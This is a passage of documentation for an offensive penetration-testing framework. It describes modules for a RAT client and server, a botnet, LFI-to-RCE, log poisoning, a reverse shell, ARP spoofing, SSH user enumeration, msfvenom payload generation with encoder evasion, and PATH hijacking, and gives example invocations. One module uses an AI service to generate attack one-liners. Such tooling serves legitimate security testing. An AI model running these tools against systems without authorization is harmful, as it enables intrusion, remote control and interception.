set to <code>"192.168.1.1"</code>, <code>endip</code> set to
<code>"192.168.1.10"</code>, and <code>spoof_ip</code> set to
<code>"192.168.1.100"</code>, set:
<code>self.params["startip"] = "192.168.1.1"</code>
<code>self.params["endip"] = "192.168.1.10"</code>
<code>self.params["spoof_ip"] = "192.168.1.100"</code> Then call:
<code>run_lazynetbios()</code></p>
<p>Note: - Ensure that <code>modules/lazynetbios.py</code> has the
appropriate permissions and dependencies to run. - Ensure that the IP
addresses are correctly set and valid for the NetBIOS scan.</p>
<h2 id="lazyhoneypot">lazyhoneypot</h2>
<p>Run the internal module located at
<code>modules/lazyhoneypot.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>email_from</code>: The email address from which messages will
be sent, specified in <code>self.params</code>.</li>
<li><code>email_to</code>: The recipient email address, specified in
<code>self.params</code>.</li>
<li><code>email_username</code>: The username for email authentication,
specified in <code>self.params</code>.</li>
<li><code>email_password</code>: The password for email authentication,
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>email_from</code>, <code>email_to</code>,
<code>email_username</code>, and <code>email_password</code> values from
<code>self.params</code>.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazyhoneypot.py</code> script with the provided email
parameters.</li>
</ol>
<p>:param email_from: The email address from which messages will be
sent. :type email_from: str</p>
<p>:param email_to: The recipient email address. :type email_to: str</p>
<p>:param email_username: The username for email authentication. :type
email_username: str</p>
<p>:param email_password: The password for email authentication. :type
email_password: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>email_from</code>,
<code>email_to</code>, <code>email_username</code>, and
<code>email_password</code> are set in <code>self.params</code>. 2. The
script <code>modules/lazyhoneypot.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazyhoneypot.py --email_from &lt;email_from&gt; --email_to &lt;email_to&gt; --email_username &lt;email_username&gt; --email_password &lt;email_password&gt;</code></p>
<p>Example: To run <code>lazyhoneypot</code> with
<code>email_from</code> set to <code>"sender@example.com"</code>,
<code>email_to</code> set to <code>"recipient@example.com"</code>,
<code>email_username</code> set to <code>"user"</code>, and
<code>email_password</code> set to <code>"pass"</code>, set:
<code>self.params["email_from"] = "sender@example.com"</code>
<code>self.params["email_to"] = "recipient@example.com"</code>
<code>self.params["email_username"] = "user"</code>
<code>self.params["email_password"] = "pass"</code> Then call:
<code>run_lazyhoneypot()</code></p>
<p>Note: - Ensure that <code>modules/lazyhoneypot.py</code> has the
appropriate permissions and dependencies to run. - Ensure that the email
credentials are correctly set for successful authentication and
operation.</p>
<h2 id="lazygptcli">lazygptcli</h2>
<p>Run the internal module to create Oneliners with Groq AI located at
<code>modules/lazygptcli.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>prompt</code>: The prompt to be used by the script, specified
in <code>self.params</code>.</li>
<li><code>api_key</code>: The API key to be set in the environment
variable <code>GROQ_API_KEY</code>, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>prompt</code> and <code>api_key</code> values
from <code>self.params</code>.</li>
<li>Checks if both <code>prompt</code> and <code>api_key</code> are set.
If either is missing, it prints an error message and returns.</li>
<li>Sets the environment variable <code>GROQ_API_KEY</code> with the
provided <code>api_key</code>.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazygptcli.py</code> script with the <code>--prompt</code>
argument.</li>
</ol>
<p>:param prompt: The prompt to be used by the script. :type prompt:
str</p>
<p>:param api_key: The API key for accessing the service. :type api_key:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>prompt</code> and
<code>api_key</code> are set in <code>self.params</code>. 2. The script
<code>modules/lazygptcli.py</code> should be present in the
<code>modules</code> directory. 3. Set the environment variable
<code>GROQ_API_KEY</code> with the API key value. 4. Run the script
with:
<code>python3 modules/lazygptcli.py --prompt &lt;prompt&gt;</code></p>
<p>Example: To run <code>lazygptcli</code> with <code>prompt</code> set
to <code>"Your prompt"</code> and <code>api_key</code> set to
<code>"your_api_key"</code>, set:
<code>self.params["prompt"] = "Your prompt"</code>
<code>self.params["api_key"] = "your_api_key"</code> Then call:
<code>run_lazygptcli()</code></p>
<p>Note: - Ensure that <code>modules/lazygptcli.py</code> has the
appropriate permissions and dependencies to run. - The environment
variable <code>GROQ_API_KEY</code> must be correctly set for the script
to function.</p>
<h2 id="lazysearch_bot">lazysearch_bot</h2>
<p>Run the internal module GROQ AI located at
<code>modules/lazysearch_bot.py</code> with the specified
parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>prompt</code>: The prompt to be used by the script, specified
in <code>self.params</code>.</li>
<li><code>api_key</code>: The API key to be set in the environment
variable <code>GROQ_API_KEY</code>, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the <code>prompt</code> and <code>api_key</code> values
from <code>self.params</code>.</li>
<li>Checks if both <code>prompt</code> and <code>api_key</code> are set.
If either is missing, it prints an error message and returns.</li>
<li>Sets the environment variable <code>GROQ_API_KEY</code> with the
provided <code>api_key</code>.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazysearch_bot.py</code> script with the <code>--prompt</code>
argument.</li>
</ol>
<p>:param prompt: The prompt to be used by the script. :type prompt:
str</p>
<p>:param api_key: The API key for accessing the service. :type api_key:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>prompt</code> and
<code>api_key</code> are set in <code>self.params</code>. 2. The script
<code>modules/lazysearch_bot.py</code> should be present in the
<code>modules</code> directory. 3. Set the environment variable
<code>GROQ_API_KEY</code> with the API key value. 4. Run the script
with:
<code>python3 modules/lazysearch_bot.py --prompt &lt;prompt&gt;</code></p>
<p>Example: To run <code>lazysearch_bot</code> with <code>prompt</code>
set to <code>"Search query"</code> and <code>api_key</code> set to
<code>"your_api_key"</code>, set:
<code>self.params["prompt"] = "Search query"</code>
<code>self.params["api_key"] = "your_api_key"</code> Then call:
<code>run_lazysearch_bot()</code></p>
<p>Note: - Ensure that <code>modules/lazysearch_bot.py</code> has the
appropriate permissions and dependencies to run. - The environment
variable <code>GROQ_API_KEY</code> must be correctly set for the script
to function.</p>
<h2 id="lazymetaextract0r">lazymetaextract0r</h2>
<p>Run the Metadata extractor internal module located at
<code>modules/lazyown_metaextract0r.py</code> with the specified
parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>path</code>: The file path to be processed by the script,
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the value for <code>path</code> from
<code>self.params</code>.</li>
<li>Checks if the <code>path</code> parameter is set. If not, it prints
an error message and returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazyown_metaextract0r.py</code> script with the appropriate
argument.</li>
</ol>
<p>:param path: The file path to be processed by the script. :type path:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>path</code> is set in
<code>self.params</code>. 2. The script
<code>modules/lazyown_metaextract0r.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazyown_metaextract0r.py --path &lt;path&gt;</code></p>
<p>Example: To run <code>lazyown_metaextract0r</code> with
<code>path</code> set to <code>/home/user/file.txt</code>, set:
<code>self.params["path"] = "/home/user/file.txt"</code> Then call:
<code>run_lazymetaextract0r()</code></p>
<p>Note: - Ensure that <code>modules/lazyown_metaextract0r.py</code> has
the appropriate permissions and dependencies to run.</p>
<h2 id="lazyownratcli">lazyownratcli</h2>
<p>Run the internal module located at
<code>modules/lazyownclient.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>lhost</code>: The IP address of the local host, specified in
<code>self.params</code>.</li>
<li><code>lport</code>: The port number of the local host, specified in
<code>self.params</code>.</li>
<li><code>rat_key</code>: The RAT key, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>lhost</code>, <code>lport</code>, and
<code>rat_key</code> from <code>self.params</code>.</li>
<li>Checks if all required parameters (<code>lhost</code>,
<code>lport</code>, and <code>rat_key</code>) are set. If any are
missing, it prints an error message and returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazyownclient.py</code> script with the appropriate
arguments.</li>
</ol>
<p>:param lhost: The IP address of the local host. :type lhost: str
:param lport: The port number of the local host. :type lport: int :param
rat_key: The RAT key. :type rat_key: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>lhost</code>,
<code>lport</code>, and <code>rat_key</code> are set in
<code>self.params</code>. 2. The script
<code>modules/lazyownclient.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazyownclient.py --host &lt;lhost&gt; --port &lt;lport&gt; --key &lt;rat_key&gt;</code></p>
<p>Example: To run <code>lazyownclient</code> with <code>lhost</code>
set to <code>192.168.1.10</code>, <code>lport</code> set to
<code>8080</code>, and <code>rat_key</code> set to
<code>my_secret_key</code>, set:
<code>self.params["lhost"] = "192.168.1.10"</code>
<code>self.params["lport"] = 8080</code>
<code>self.params["rat_key"] = "my_secret_key"</code> Then call:
<code>run_lazyownratcli()</code></p>
<p>Note: - Ensure that <code>modules/lazyownclient.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazyownrat">lazyownrat</h2>
<p>Run the internal module located at
<code>modules/lazyownserver.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>rhost</code>: The IP address of the remote host, specified in
<code>self.params</code>.</li>
<li><code>rport</code>: The port number of the remote host, specified in
<code>self.params</code>.</li>
<li><code>rat_key</code>: The RAT key, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rhost</code>, <code>rport</code>, and
<code>rat_key</code> from <code>self.params</code>.</li>
<li>Checks if all required parameters (<code>rhost</code>,
<code>rport</code>, and <code>rat_key</code>) are set. If any are
missing, it prints an error message and returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazyownserver.py</code> script with the appropriate
arguments.</li>
</ol>
<p>:param rhost: The IP address of the remote host. :type rhost: str
:param rport: The port number of the remote host. :type rport: int
:param rat_key: The RAT key. :type rat_key: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rhost</code>,
<code>rport</code>, and <code>rat_key</code> are set in
<code>self.params</code>. 2. The script
<code>modules/lazyownserver.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazyownserver.py --host &lt;rhost&gt; --port &lt;rport&gt; --key &lt;rat_key&gt;</code></p>
<p>Example: To run <code>lazyownserver</code> with <code>rhost</code>
set to <code>192.168.1.10</code>, <code>rport</code> set to
<code>8080</code>, and <code>rat_key</code> set to
<code>my_secret_key</code>, set:
<code>self.params["rhost"] = "192.168.1.10"</code>
<code>self.params["rport"] = 8080</code>
<code>self.params["rat_key"] = "my_secret_key"</code> Then call:
<code>run_lazyownrat()</code></p>
<p>Note: - Ensure that <code>modules/lazyownserver.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazybotnet">lazybotnet</h2>
<p>Run the internal module located at <code>modules/lazybotnet.py</code>
with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>rhost</code>: The IP address of the remote host, hardcoded to
“0.0.0.0”.</li>
<li><code>rport</code>: The port number of the remote host, specified in
<code>self.params</code>.</li>
<li><code>rat_key</code>: The RAT key, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rport</code> and <code>rat_key</code>
from <code>self.params</code>. The <code>rhost</code> is hardcoded to
“0.0.0.0”.</li>
<li>Checks if all required parameters (<code>rport</code> and
<code>rat_key</code>) are set. If any are missing, it prints an error
message and returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazybotnet.py</code> script with the appropriate arguments.</li>
</ol>
<p>:param rport: The port number of the remote host. :type rport: int
:param rat_key: The RAT key. :type rat_key: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rport</code> and
<code>rat_key</code> are set in <code>self.params</code>. 2. The script
<code>modules/lazybotnet.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazybotnet.py --host &lt;rhost&gt; --port &lt;rport&gt; --key &lt;rat_key&gt;</code></p>
<p>Example: To run <code>lazybotnet</code> with <code>rport</code> set
to <code>1234</code> and <code>rat_key</code> set to
<code>my_key</code>, set: <code>self.params["rport"] = 1234</code>
<code>self.params["rat_key"] = "my_key"</code> Then call:
<code>run_lazybotnet()</code></p>
<p>Note: - Ensure that <code>modules/lazybotnet.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazylfi2rce">lazylfi2rce</h2>
<p>Run the internal module located at
<code>modules/lazylfi2rce.py</code> with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>rhost</code>: The IP address of the remote host, specified in
<code>self.params</code>.</li>
<li><code>rport</code>: The port number of the remote host, specified in
<code>self.params</code>.</li>
<li><code>lhost</code>: The IP address of the local host, specified in
<code>self.params</code>.</li>
<li><code>lport</code>: The port number of the local host, specified in
<code>self.params</code>.</li>
<li><code>field</code>: The field name for the LFI (Local File
Inclusion) attack, specified in <code>self.params</code>.</li>
<li><code>wordlist</code>: The path to the wordlist file used for the
attack, specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rhost</code>, <code>rport</code>,
<code>lhost</code>, <code>lport</code>, <code>field</code>, and
<code>wordlist</code> from <code>self.params</code>.</li>
<li>Checks if all required parameters are set. If any are missing, it
prints an error message and returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazylfi2rce.py</code> script with the appropriate arguments.</li>
</ol>
<p>:param rhost: The IP address of the remote host. :type rhost: str
:param rport: The port number of the remote host. :type rport: int
:param lhost: The IP address of the local host. :type lhost: str :param
lport: The port number of the local host. :type lport: int :param field:
The field name for the LFI attack. :type field: str :param wordlist: The
path to the wordlist file. :type wordlist: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rhost</code>,
<code>rport</code>, <code>lhost</code>, <code>lport</code>,
<code>field</code>, and <code>wordlist</code> are set in
<code>self.params</code>. 2. The script
<code>modules/lazylfi2rce.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazylfi2rce.py --rhost &lt;rhost&gt; --rport &lt;rport&gt; --lhost &lt;lhost&gt; --lport &lt;lport&gt; --field &lt;field&gt; --wordlist &lt;wordlist&gt;</code></p>
<p>Example: To run the lazylfi2rce with <code>rhost</code> set to
<code>192.168.1.1</code>, <code>rport</code> set to <code>80</code>,
<code>lhost</code> set to <code>192.168.1.2</code>, <code>lport</code>
set to <code>8080</code>, <code>field</code> set to <code>file</code>,
and <code>wordlist</code> set to <code>path/to/wordlist.txt</code>, set:
<code>self.params["rhost"] = "192.168.1.1"</code>
<code>self.params["rport"] = 80</code>
<code>self.params["lhost"] = "192.168.1.2"</code>
<code>self.params["lport"] = 8080</code>
<code>self.params["field"] = "file"</code>
<code>self.params["wordlist"] = "path/to/wordlist.txt"</code> Then call:
<code>run_lazylfi2rce()</code></p>
<p>Note: - Ensure that <code>modules/lazylfi2rce.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazylogpoisoning">lazylogpoisoning</h2>
<p>Run the internal module located at
<code>modules/lazylogpoisoning.py</code> with the specified
parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>rhost</code>: The IP address of the remote host, specified in
<code>self.params</code>.</li>
<li><code>lhost</code>: The IP address of the local host, specified in
<code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rhost</code> and <code>lhost</code>
from <code>self.params</code>.</li>
<li>Checks if the required parameters <code>rhost</code> and
<code>lhost</code> are set. If not, it prints an error message and
returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazylogpoisoning.py</code> script with the appropriate
arguments.</li>
</ol>
<p>:param rhost: The IP address of the remote host. Must be set in
<code>self.params</code>. :type rhost: str :param lhost: The IP address
of the local host. Must be set in <code>self.params</code>. :type lhost:
str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rhost</code> and
<code>lhost</code> are set in <code>self.params</code>. 2. The script
<code>modules/lazylogpoisoning.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazylogpoisoning.py --rhost &lt;rhost&gt; --lhost &lt;lhost&gt;</code></p>
<p>Example: To run the lazylogpoisoning with <code>rhost</code> set to
<code>192.168.1.1</code> and <code>lhost</code> set to
<code>192.168.1.2</code>, set:
<code>self.params["rhost"] = "192.168.1.1"</code>
<code>self.params["lhost"] = "192.168.1.2"</code> Then call:
<code>run_lazylogpoisoning()</code></p>
<p>Note: - Ensure that <code>modules/lazylogpoisoning.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazybotcli">lazybotcli</h2>
<p>Run the internal module located at <code>modules/lazybotcli.py</code>
with the specified parameters.</p>
<p>This function executes the script with the following arguments:</p>
<ul>
<li><code>rhost</code>: The IP address of the remote host (default is
<code>"0.0.0.0"</code>).</li>
<li><code>rport</code>: The port number to be used, specified in
<code>self.params</code>.</li>
<li><code>rat_key</code>: The key for the Remote Access Tool (RAT),
specified in <code>self.params</code>.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rport</code> and <code>rat_key</code>
from <code>self.params</code>.</li>
<li>Checks if the required parameters <code>rport</code> and
<code>rat_key</code> are set. If not, it prints an error message and
returns.</li>
<li>Calls the <code>run_script</code> method to execute the
<code>lazybotcli.py</code> script with the appropriate arguments.</li>
</ol>
<p>:param rport: The port number for the connection. Must be set in
<code>self.params</code>. :type rport: int :param rat_key: The key for
the RAT. Must be set in <code>self.params</code>. :type rat_key: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rport</code> and
<code>rat_key</code> are set in <code>self.params</code>. 2. The script
<code>modules/lazybotcli.py</code> should be present in the
<code>modules</code> directory. 3. Run the script with:
<code>python3 modules/lazybotcli.py --host 0.0.0.0 --port &lt;rport&gt; --key &lt;rat_key&gt;</code></p>
<p>Example: To run the lazybotcli with port <code>12345</code> and key
<code>mysecretkey</code>, set: <code>self.params["rport"] = 12345</code>
<code>self.params["rat_key"] = "mysecretkey"</code> Then call:
<code>run_lazybotcli()</code></p>
<p>Note: - Ensure that <code>modules/lazybotcli.py</code> has the
appropriate permissions and dependencies to run.</p>
<h2 id="lazyssh77enum">lazyssh77enum</h2>
<p>Run the internal module located at
<code>modules/lazybrutesshuserenum.py</code> with the specified
parameters. ONLY valid for 7.x Version !!!</p>
<p>The script will be executed with the following arguments:</p>
<ul>
<li><code>wordlist</code>: The path to the wordlist file containing
potential usernames for SSH enumeration.</li>
<li><code>rhost</code>: The target IP address or hostname for SSH
enumeration.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>wordlist</code> and
<code>rhost</code> from <code>self.params</code>.</li>
<li>Prints a warning message about the potential inaccuracy of the
results.</li>
<li>Constructs the command to run the
<code>lazybrutesshuserenum.sh</code> script with the specified
arguments.</li>
<li>Executes the command using the <code>os.system</code> method.</li>
</ol>
<p>:param wordlist: The path to the wordlist file for username
enumeration. Must be set in <code>self.params</code>. :type wordlist:
str :param rhost: The target IP address or hostname for SSH enumeration.
Must be set in <code>self.params</code>. :type rhost: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>wordlist</code> and
<code>rhost</code> are set in <code>self.params</code>. 2. Run the
script <code>modules/lazybrutesshuserenum.sh</code> with the appropriate
arguments.</p>
<p>Dependencies: - <code>modules/lazybrutesshuserenum.sh</code> must be
present in the <code>modules</code> directory and must be
executable.</p>
<p>Example: To run the SSH user enumeration with a wordlist located at
<code>/path/to/wordlist.txt</code> and target IP
<code>192.168.1.1</code>, set:
<code>self.params["usrwordlist"] = "/path/to/wordlist.txt"</code>
<code>self.params["rhost"] = "192.168.1.1"</code> Then call:
<code>run_lazyssh77enum()</code></p>
<p>Note: - The accuracy of the results may vary depending on the version
of the script and the wordlist used.</p>
<h2 id="lazyburpfuzzer">lazyburpfuzzer</h2>
<p>Run the internal module located at
<code>modules/lazyown_burpfuzzer.py</code> with the specified
parameters.</p>
<p>The script will be executed with the following arguments:</p>
<ul>
<li><code>--url</code>: The target URL for the fuzzer.</li>
<li><code>--method</code>: The HTTP method to use (e.g., GET,
POST).</li>
<li><code>--proxy_port</code>: The port for the proxy server.</li>
<li><code>--headers</code>: Optional HTTP headers to include in the
request.</li>
<li><code>--data</code>: Optional data to include in the request
body.</li>
<li><code>--params</code>: Optional URL parameters to include in the
request.</li>
<li><code>--json_data</code>: Optional JSON data to include in the
request body.</li>
<li><code>-w</code>: Optional wordlist for fuzzing.</li>
<li><code>-hc</code>: Optional hide code for fuzzing.</li>
</ul>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>url</code>, <code>method</code>,
<code>headers</code>, <code>params</code>, <code>data</code>,
<code>json_data</code>, <code>proxy_port</code>, <code>wordlist</code>,
and <code>hide_code</code> from <code>self.params</code>.</li>
<li>Constructs the command to run the <code>lazyown_burpfuzzer.py</code>
script with the specified arguments.</li>
<li>Adds optional parameters based on whether the corresponding files
(<code>headers_file</code>, <code>data_file</code>,
<code>params_file</code>, <code>json_data_file</code>) are
provided.</li>
<li>Executes the command using the <code>run_command</code> method.</li>
</ol>
<p>:param url: The target URL for the fuzzer. Must be set in
<code>self.params</code>. :type url: str :param method: The HTTP method
to use. Must be set in <code>self.params</code>. :type method: str
:param headers: Optional HTTP headers. Must be set in
<code>self.params</code> or provided via <code>headers_file</code>.
:type headers: str :param params: Optional URL parameters. Must be set
in <code>self.params</code> or provided via <code>params_file</code>.
:type params: str :param data: Optional data for the request body. Must
be set in <code>self.params</code> or provided via
<code>data_file</code>. :type data: str :param json_data: Optional JSON
data for the request body. Must be set in <code>self.params</code> or
provided via <code>json_data_file</code>. :type json_data: str :param
proxy_port: The port for the proxy server. Must be set in
<code>self.params</code>. :type proxy_port: int :param wordlist:
Optional wordlist for fuzzing. Must be set in <code>self.params</code>.
:type wordlist: str :param hide_code: Optional code to hide. Must be set
in <code>self.params</code>. :type hide_code: int :param headers_file:
Optional file containing headers. :type headers_file: str, optional
:param data_file: Optional file containing data. :type data_file: str,
optional :param params_file: Optional file containing parameters. :type
params_file: str, optional :param json_data_file: Optional file
containing JSON data. :type json_data_file: str, optional</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>url</code>,
<code>method</code>, and <code>proxy_port</code> are set in
<code>self.params</code>. 2. Provide additional parameters as needed. 3.
Run the script <code>modules/lazyown_burpfuzzer.py</code> with the
appropriate arguments.</p>
<p>Dependencies: - <code>modules/lazyown_burpfuzzer.py</code> must be
present in the <code>modules</code> directory and must be
executable.</p>
<p>Example: To run the fuzzer with URL <code>http://example.com</code>,
HTTP method <code>POST</code>, and proxy port <code>8080</code>, set:
<code>self.params["url"] = "http://example.com"</code>
<code>self.params["method"] = "POST"</code>
<code>self.params["proxy_port"] = 8080</code> Then call:
<code>run_lazyburpfuzzer()</code></p>
<p>Note: - Ensure that all required parameters are set before calling
this function. - Parameters can also be provided via corresponding
files.</p>
<h2 id="lazyreverse_shell">lazyreverse_shell</h2>
<p>Run the internal module located at
<code>modules/lazyreverse_shell.sh</code> with the specified
parameters.</p>
<p>The script will be executed with the following arguments: -
<code>--ip</code>: The IP address to use for the reverse shell. -
<code>--puerto</code>: The port to use for the reverse shell.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>rhost</code> (IP address) and
<code>reverse_shell_port</code> (port) from
<code>self.params</code>.</li>
<li>Validates that <code>rhost</code> and
<code>reverse_shell_port</code> parameters are set.</li>
<li>Constructs the command to run the <code>lazyreverse_shell.sh</code>
script with the specified arguments.</li>
<li>Executes the command.</li>
</ol>
<p>:param ip: The IP address to use for the reverse shell. Must be set
in <code>self.params</code>. :type ip: str :param port: The port to use
for the reverse shell. Must be set in <code>self.params</code>. :type
port: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>rhost</code> and
<code>reverse_shell_port</code> are set in <code>self.params</code>. 2.
Run the script <code>modules/lazyreverse_shell.sh</code> with the
appropriate arguments.</p>
<p>Dependencies: - <code>modules/lazyreverse_shell.sh</code> must be
present in the <code>modules</code> directory and must be
executable.</p>
<p>Example: To set up a reverse shell with IP <code>192.168.1.100</code>
and port <code>4444</code>, set:
<code>self.params["rhost"] = "192.168.1.100"</code>
<code>self.params["reverse_shell_port"] = "4444"</code> Then call:
<code>run_lazyreverse_shell()</code></p>
<p>Note: - Ensure that <code>modules/lazyreverse_shell.sh</code> has the
necessary permissions to execute. - Parameters must be set before
calling this function.</p>
<h2 id="lazyarpspoofing">lazyarpspoofing</h2>
<p>Run the internal module located at
<code>modules/lazyarpspoofing.py</code> with the specified
parameters.</p>
<p>The script will be executed with the following arguments: -
<code>--device</code>: The network interface to use for ARP spoofing. -
<code>lhost</code>: The local host IP address to spoof. -
<code>rhost</code>: The remote host IP address to spoof.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the values for <code>lhost</code>, <code>rhost</code>, and
<code>device</code> from <code>self.params</code>.</li>
<li>Validates that <code>lhost</code>, <code>rhost</code>, and
<code>device</code> parameters are set.</li>
<li>Constructs the command to run the <code>lazyarpspoofing.py</code>
script with the specified arguments.</li>
<li>Executes the command.</li>
</ol>
<p>:param lhost: The local host IP address to spoof. Must be set in
<code>self.params</code>. :type lhost: str :param rhost: The remote host
IP address to spoof. Must be set in <code>self.params</code>. :type
rhost: str :param device: The network interface to use for ARP spoofing.
Must be set in <code>self.params</code>. :type device: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>lhost</code>,
<code>rhost</code>, and <code>device</code> are set in
<code>self.params</code>. 2. Run the script
<code>modules/lazyarpspoofing.py</code> with the appropriate
arguments.</p>
<p>Dependencies: - <code>modules/lazyarpspoofing.py</code> must be
present in the <code>modules</code> directory and must be
executable.</p>
<p>Example: To execute ARP spoofing with local host
<code>192.168.1.2</code>, remote host <code>192.168.1.1</code>, and
device <code>eth0</code>, set:
<code>self.params["lhost"] = "192.168.1.2"</code>
<code>self.params["rhost"] = "192.168.1.1"</code>
<code>self.params["device"] = "eth0"</code> Then call:
<code>run_lazyarpspoofing()</code></p>
<p>Note: - Ensure that <code>modules/lazyarpspoofing.py</code> has the
necessary permissions to execute. - Parameters must be set before
calling this function.</p>
<h2 id="lazyattack">lazyattack</h2>
<p>Run the internal module located at <code>modules/lazyatack.sh</code>
with the specified parameters.</p>
<p>The script will be executed with the following arguments: -
<code>--modo</code>: The mode of the attack. - <code>--ip</code>: The
target IP address. - <code>--atacante</code>: The attacker IP
address.</p>
<p>The function performs the following steps:</p>
<ol type="1">
<li>Retrieves the current working directory.</li>
<li>Validates that <code>mode</code>, <code>rhost</code>, and
<code>lhost</code> parameters are set.</li>
<li>Constructs the command to run the <code>lazyatack.sh</code> script
with the specified arguments.</li>
<li>Executes the command.</li>
</ol>
<p>:param mode: The mode in which the attack should be run. Must be set
in <code>self.params</code>. :type mode: str :param target_ip: The IP
address of the target. Must be set in <code>self.params</code>. :type
target_ip: str :param attacker_ip: The IP address of the attacker. Must
be set in <code>self.params</code>. :type attacker_ip: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>mode</code>,
<code>rhost</code>, and <code>lhost</code> are set in
<code>self.params</code>. 2. Run the script
<code>modules/lazyatack.sh</code> with the appropriate arguments.</p>
<p>Dependencies: - <code>modules/lazyatack.sh</code> must be present in
the <code>modules</code> directory and must be executable.</p>
<p>Example: To execute the attack with mode <code>scan</code>, target IP
<code>192.168.1.100</code>, and attacker IP <code>192.168.1.1</code>,
set: <code>self.params["mode"] = "scan"</code>
<code>self.params["rhost"] = "192.168.1.100"</code>
<code>self.params["lhost"] = "192.168.1.1"</code> Then call:
<code>run_lazyattack()</code></p>
<p>Note: - Ensure that <code>modules/lazyatack.sh</code> has the
necessary permissions to execute. - Parameters must be set before
calling this function.</p>
<h2 id="lazymsfvenom">lazymsfvenom</h2>
<p>Runs the <code>msfvenom</code> tool to generate payloads based on
user input.</p>
<p>Prompts the user to select a payload type from a list and executes
the corresponding <code>msfvenom</code> command to generate a payload.
Moves the generated payloads to a <code>sessions</code> directory and
sets appropriate permissions. Optionally compresses the payloads using
UPX and handles a C payload with shikata_ga_nai.</p>
<p>:param line: Command line arguments for the script. :return: None</p>
<h2 id="lazyaslrcheck">lazyaslrcheck</h2>
<p>Creates a path hijacking attack by performing the following
steps:</p>
<ol type="1">
<li>Appends the value of <code>binary_name</code> to a temporary script
located at <code>modules/tmp.sh</code>.</li>
<li>Copies this temporary script to <code>/tmp</code> with the name
specified by <code>binary_name</code>.</li>
<li>Sets executable permissions on the copied script.</li>
<li>Prepends <code>/tmp</code> to the system’s PATH environment variable
to ensure the script is executed in preference to other binaries.</li>
</ol>
<p>The function then prints out each command being executed and a
message indicating the binary name used for the path hijacking.</p>
<p>:param binary_name: The name of the binary to be used in the path
hijacking attack. It should be set in <code>self.params</code> before
calling this method. :type binary_name: str</p>
<p>:returns: None</p>
<p>Manual execution: 1. Ensure that <code>binary_name</code> is set in
<code>self.params</code>. 2. Append the binary name to
<code>modules/tmp.sh</code>. 3. Copy <code>modules/tmp.sh</code> to
